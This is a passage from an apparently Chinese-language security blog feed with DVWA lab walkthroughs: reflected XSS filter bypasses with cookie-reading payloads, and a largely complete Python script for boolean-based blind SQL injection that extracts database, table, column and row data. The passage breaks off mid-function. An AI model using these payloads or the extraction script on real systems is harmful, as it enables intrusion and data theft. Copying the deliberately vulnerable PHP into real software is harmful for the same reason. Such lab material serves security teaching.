<span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p><p> 输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNT1gJ.png" alt="MNT1gJ.png"></p><p>查看源码可以发现代码被解释执行了</p><p><img src="https://s2.ax1x.com/2019/11/14/MNTa4O.png" alt="MNTa4O.png"></p><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNTxxJ.png" alt="MNTxxJ.png"></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="Reflected-XSS-Source-1"><a href="#Reflected-XSS-Source-1" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p> Medium级别的代码相对于Low级别的代码使用<code>str_replace</code>函数将输入中的<code>&lt;script&gt;</code>删除 </p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol><li>使用双写绕过，输入 <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code> </li><li>使用大小写绕过，输入 <code>&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>输入其他标签，如<code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code></li></ol><p>结果：</p><p><img src="https://s2.ax1x.com/2019/11/14/MNH1mR.png" alt="MNH1mR.png"></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="Reflected-XSS-Source-2"><a href="#Reflected-XSS-Source-2" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p> 可以看到High级别的代码使用了  <code>preg_replace</code> 函数执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 </p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p><code>&lt;script&gt;</code> 标签不管用了，但是可以使用其他标签绕过 </p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MNbeHI.png" alt="MNbeHI.png"></p>]]></content>
      
      
      <categories>
          
          <category> xss攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-SQL_Injection_Blind（sql盲注）</title>
      <link href="/2019/11/12/DVWA-SQL-Injection-Blind/"/>
      <url>/2019/11/12/DVWA-SQL-Injection-Blind/</url>
      
        <content type="html"><![CDATA[<p>DVWA的sql盲注。</p><a id="more"></a><p>SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">盲注中常用的几个函数：</span><br><span class="line">substr(a,b,<span class="built_in">c</span>)：从b位置开始，截取字符串a的<span class="built_in">c</span>长度 </span><br><span class="line"><span class="built_in">count</span>()：计算总数 </span><br><span class="line">ascii()：返回字符的ascii码 </span><br><span class="line">length()：返回字符串的长度 <span class="keyword">left</span>(a,b)：从左往右截取字符串a的前b个字符 </span><br><span class="line">sleep(n):将程序挂起n秒</span><br></pre></td></tr></table></figure><p> <strong>手工盲注思路</strong> </p><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：</span><br><span class="line">1.判断是否存在注入，注入是字符型还是数字型 </span><br><span class="line">2.猜解当前数据库名 </span><br><span class="line">3.猜解数据库中的表名</span><br><span class="line">4.猜解表中的字段名 </span><br><span class="line">5.猜解数据</span><br></pre></td></tr></table></figure><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="SQL-Injection-Blind-Source"><a href="#SQL-Injection-Blind-Source" class="headerlink" title="SQL Injection (Blind) Source"></a><strong>SQL Injection (Blind) Source</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h3><p> Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： </p><p><code>User ID exists in the database.与 User ID is MISSING from the database.</code></p><p> 所以这里是SQL盲注漏洞。 </p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p> 输入1 ，发现 </p><p><img src="https://s2.ax1x.com/2019/11/12/M8pniV.png" alt="M8pniV.png"></p><p> 输入 1’， 发现 </p><p><img src="https://s2.ax1x.com/2019/11/12/M8CxaR.png" alt="M8CxaR.png"></p><p> 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 </p><h3 id="获取数据库长度"><a href="#获取数据库长度" class="headerlink" title="获取数据库长度"></a>获取数据库长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.database_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and length(database())=&#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.database_length = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\ncan not get the database_length"</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGOfVP.png" alt="MGOfVP.png"></p><h3 id="检查页面是否正常"><a href="#检查页面是否正常" class="headerlink" title="检查页面是否正常"></a>检查页面是否正常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.database = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">            self.database += <span class="string">'666'</span></span><br><span class="line">    <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\n can not get the database"</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGjklQ.png" alt="MGjklQ.png"></p><h3 id="获取表长"><a href="#获取表长" class="headerlink" title="获取表长"></a>获取表长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.table_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the table_length'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MGjdfO.png" alt="MGjdfO.png"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">        self.table_name.append(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the table_name'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJie0g.png" alt="MJie0g.png"></p><h3 id="获取表列数量"><a href="#获取表列数量" class="headerlink" title="获取表列数量"></a>获取表列数量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    self.column_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.column_num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br></pre></td></tr></table></figure><h3 id="获取总长度"><a href="#获取总长度" class="headerlink" title="获取总长度"></a>获取总长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.column_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the column_length'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23"</span>.format(str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">        self.column_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the column_name'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJFlUH.png" alt="MJFlUH.png"></p><h3 id="获取字段数目"><a href="#获取字段数目" class="headerlink" title="获取字段数目"></a>获取字段数目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.word_num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the word_num'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取列长"><a href="#获取列长" class="headerlink" title="获取列长"></a>获取列长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">        theurl = self.url + <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">        html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">        <span class="keyword">if</span> self.check(html):</span><br><span class="line">            self.word_length.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'\ncan not get the word length'</span>)</span><br></pre></td></tr></table></figure><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23"</span>.format(column_name,str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span 